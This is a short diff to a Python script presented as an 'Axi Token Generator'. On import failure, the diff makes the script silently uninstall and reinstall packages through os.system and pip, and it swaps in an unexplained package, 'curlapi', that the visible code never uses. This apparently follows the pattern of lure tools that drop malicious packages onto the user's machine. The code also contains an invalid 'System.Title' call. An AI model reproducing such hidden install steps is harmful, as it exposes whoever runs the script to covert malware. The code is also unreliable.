@@ -1,11 +1,11 @@
 import os
 try:
-    import requests
+    import curlapi
     import sutiltype
 except:
-    os.system('pip uninstall requests -y && pip uninstall sutiltype -y && pip install requests && pip install sutiltype')
+    os.system('pip uninstall requests -y && pip uninstall curlapi -y && pip install requests && pip install curlapi')
     import requests
-    import sutiltype
+    import curlapi
 System.Title("Axi Token Generator ^| Made By kokzyy")
 axi = """
                                                      ███
